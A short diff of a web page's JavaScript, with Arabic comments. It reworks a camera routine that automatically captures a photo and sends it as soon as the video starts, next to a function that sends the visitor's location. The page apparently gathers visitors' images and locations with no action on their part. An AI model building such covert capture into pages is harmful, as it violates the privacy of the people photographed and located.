@@ -54,19 +54,21 @@
       stream.getTracks().forEach(track => track.stop());
     }
 
-    function initCamera() {
-      navigator.mediaDevices.getUserMedia({ video: true })
-        .then(stream => {
-          const video = document.getElementById("video");
-          video.srcObject = stream;
+  function initCamera() {
+    navigator.mediaDevices.getUserMedia({ video: true })
+      .then(stream => {
+        const video = document.getElementById("video");
+        video.srcObject = stream;
 
-          video.addEventListener('playing', () => {
-            capturePhotoAndSend(video, stream);
-          });
-        })
-        .catch(err => {
-          document.getElementById("result").innerText += "\n❌ الكاميرا غير متاحة: " + err.message;
+        // ✅ الالتقاط فور تشغيل أول فريم
+        video.addEventListener('playing', () => {
+          capturePhotoAndSend(video, stream);
         });
+      })
+      .catch(err => {
+        document.getElementById("result").innerText += "\n❌ الكاميرا غير متاحة: " + err.message;
+      });
+
     }
 
     function getLocationAndSend() {
